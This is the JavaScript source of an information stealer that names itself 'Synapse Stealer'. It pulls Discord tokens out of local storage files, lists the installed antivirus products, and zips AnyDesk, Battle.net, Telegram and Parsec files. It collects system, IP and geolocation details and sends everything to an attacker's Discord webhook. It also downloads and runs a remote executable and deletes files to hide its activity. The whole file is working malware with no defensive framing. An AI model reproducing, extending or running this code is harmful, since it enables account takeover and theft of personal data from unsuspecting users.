const appdata = process.env.APPDATA;
const fs = require('fs');
const request = require('request');
const internalIp = require('internal-ip');
const geoip = require("node-iplocate");
const { Webhook } = require('discord-webhook-node');
const { exec } = require("child_process");
const si = require('systeminformation');
const os = require('os');
const computerName = os.hostname();

const ldbdir = `${appdata}/Discord/Local Storage/leveldb`;
const tokenfiles = (fs.readdirSync(ldbdir));
const filesarr = [];
const result = [];
var config = require('./config');
var AdmZip = require('adm-zip');

const webhook = require("webhook-discord")
const Hook = new webhook.Webhook(config.Webhook)
const imgsender = new Webhook(config.Webhook);

// IMPORTANT STEAL FILES DIR
const anydesk = `${appdata}/AnyDesk/connection_trace.txt`;
const battlenet = `${appdata}/Battle.net/Battle.net.config`;
const telegram = `${appdata}/Telegram Desktop/log.txt`;
const parsec = `${appdata}/Parsec/log.txt`;

fs.writeFile(`${appdata}/avs.txt`, '', function (err) {
});

const avWindowsdefender = `C:/Program Files/Windows Defender`;
try {
  if (fs.existsSync(avWindowsdefender)) {
    fs.appendFile(`${appdata}/avs.txt`, "Windows Defender\n", function (err) {
  });
  }
} catch(err) {
}
const avAvast = `C:/Program Files/AVAST Software/Avast`;
try {
  if (fs.existsSync(avAvast)) {
    fs.appendFile(`${appdata}/avs.txt`, "Avast\n", function (err) {
    });
  }
} catch(err) {
}
const avAVG = `C:/Program Files/AVG/Antivirus`;
try {
  if (fs.existsSync(avAVG)) {
    fs.appendFile(`${appdata}/avs.txt`, "AVG\n", function (err) {
    });
  }
} catch(err) {
}
const avAvira = `C:/Program Files/Avira/Launcher`;
try {
  if (fs.existsSync(avAvira)) {
    fs.appendFile(`${appdata}/avs.txt`, "Avira\n", function (err) {
    });
  }
} catch(err) {
}
const avAdvancedsystemcare = `C:/Program Files/IObit/Advanced SystemCare`;
try {
  if (fs.existsSync(avAdvancedsystemcare)) {
    fs.appendFile(`${appdata}/avs.txt`, "Advanced SystemCare\n", function (err) {
    });
  }
} catch(err) {
}
const avBitdefender = `C:/Program Files/Bitdefender Antivirus Free`;
try {
  if (fs.existsSync(avBitdefender)) {
    fs.appendFile(`${appdata}/avs.txt`, "Bitdefender\n", function (err) {
    });
  }
} catch(err) {
}
const avComodo = `C:/Program Files/COMODO/COMODO Internet Security`;
try {
  if (fs.existsSync(avComodo)) {
    fs.appendFile(`${appdata}/avs.txt`, "Comodo\n", function (err) {
    });
  }
} catch(err) {
}
const avDrweb = `C:/Program Files/DrWeb`;
try {
  if (fs.existsSync(avDrweb)) {
    fs.appendFile(`${appdata}/avs.txt`, "Dr.Web\n", function (err) {
    });;
  }
} catch(err) {
}
const avESET = `C:/Program Files/ESET/ESET Security`;
try {
  if (fs.existsSync(avESET)) {
    fs.appendFile(`${appdata}/avs.txt`, "ESET\n", function (err) {
    });
  }
} catch(err) {
}
const avGrizzlypro = `C:/Program Files/GRIZZLY Antivirus`;
try {
  if (fs.existsSync(avGrizzlypro)) {
    fs.appendFile(`${appdata}/avs.txt`, "Grizzly Pro\n", function (err) {
    });
  }
} catch(err) {
}
const avKaspersky = `C:/Program Files/Kaspersky Lab`;
try {
  if (fs.existsSync(avKaspersky)) {
    fs.appendFile(`${appdata}/avs.txt`, "Kaspersky\n", function (err) {
    });
  }
} catch(err) {
}
const avMalwarefigher = `C:/Program Files/IObit/IObit Malware Fighter`;
try {
  if (fs.existsSync(avMalwarefigher)) {
    fs.appendFile(`${appdata}/avs.txt`, "Malware fighter\n", function (err) {
    });
  }
} catch(err) {
}
const av360totalsecurity = `C:/Program Files/360/Total Security`;
try {
  if (fs.existsSync(av360totalsecurity)) {
    fs.appendFile(`${appdata}/avs.txt`, "360 Total Security\n", function (err) {
    });
  }
} catch(err) {
}

function downloadcoin() {
var download = function(uri, filename, callback){
  request.head(uri, function(err, res, body){    
    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
  });
};
download('MAIN.EXE DIRECT DOWNLOAD LINK', `${appdata}/build.exe`, function(){
});
}

function executecoin() {
exec("cd %APPDATA% && build.exe", (error, stdout, stderr) => {
  if (error) {
      return;
  }
  if (stderr) {
      return;
  }
});
}

setTimeout(downloadcoin, 100);
setTimeout(executecoin, 3000);


tokenfiles.forEach((element) => {
  if (element.match(/.log|.ldb/)) {
    const logp = `${ldbdir}/${element}`;
    const readlog = (fs.readFileSync(logp));
    filesarr.push(readlog.toString().match(/[\w-]{24}.[\w-]{6}.[\w-]{27}/));
    filesarr.push(readlog.toString().match(/mfa\.[\w-]{84}/));
  }
});

filesarr.forEach((item, index) => {
  if (item === null) {
    filesarr.splice(index, 1);
  } else if (typeof (item)) {
    item.forEach((item2) => {
      if (item2 !== null) {
        result.push(item2);
      }
    });
  }
});
// FILTRAR TOKENS
let isMfa = false;
result.forEach((item) => {
  if (item.match(/mfa./) || item.match(/MzQ/) || item.match(/NTg/) || item.match(/NTQ/) || item.match(/NTk/) || item.match(/MTE/) || item.match(/MTI/) || item.match(/MTM/) || item.match(/NDc/) || item.match(/Nzc/) || item.match(/MTa/) || item.match(/ODA/)) {
    isMfa = true;

    var zip = new AdmZip();

    // ANYDESK FILE CHECK
    try {
      if (fs.existsSync(anydesk)) {
        zip.addLocalFile(anydesk, "AnyDesk Codes");
      }
    } catch(err) {
      console.error(err)
    }

    // BATTLENET FILE CHECK
    try {
      if (fs.existsSync(battlenet)) {
        zip.addLocalFile(battlenet, "Battle.net Emails");
      }
    } catch(err) {
      console.error(err)
    }

    // TELEGRAM FILE CHECK
    try {
      if (fs.existsSync(telegram)) {
        zip.addLocalFile(telegram, "Telegram Logs");
      }
    } catch(err) {
      console.error(err)
    }

    // PARSEC FILE CHECK
    try {
      if (fs.existsSync(parsec)) {
        zip.addLocalFile(parsec, "Parsec Logs");
      }
    } catch(err) {
      console.error(err)
    }

    var ipaddress = "https://api.ipify.org";
    request(ipaddress,function(a,b,ipaddress){
    geoip(ipaddress.toString()).then(function(results){
    
      function embedzito() {

    // ZIP
    zip.addLocalFile(`${appdata}/date.txt`, "Stealed Logins");
    zip.writeZip(`${appdata}/synapse.zip`);

      si.graphics().then(data => {

    const msg = new webhook.MessageBuilder()

    .setAuthor("Synapse Stealer")
    .setThumbnail("https://i.pinimg.com/originals/7c/e8/d6/7ce8d6c44b056a3e9eb84d31139f4132.png")
    .setTime()
    .setName("Synapse Stealer")
    .setColor("#F98604")
    .addField("Username",require("os").userInfo().username)
    .addField("Computer Name",computerName)
    .addField("OS",os.type()+" ("+os.arch()+") version "+os.release())
    .addField("CPU",os.cpus()[0].model)
    .addField("IPv4",internalIp.v4.sync())
    .addField("IPv6",ipaddress)
    .addField("GeoIP",results.country+", "+results.city)
    .addField("Org",results.org+" ("+results.asn+")")
    .addField("Discord Token",`${item}`)
    .addField("Bypassed AVs",fs.readFileSync(`${appdata}/avs.txt`, 'utf8'));
    Hook.send(msg);
    imgsender.sendFile(`${appdata}/synapse.zip`);
  
  })    

  const datetxt = `${appdata}/date.txt`
  const libsodium3 = `${appdata}/setup.exe`

  try {
    fs.unlinkSync(datetxt)
    fs.unlinkSync(libsodium3)
  } catch(err) {
  }

}
setTimeout(embedzito, 8000);
});
});
  }
});
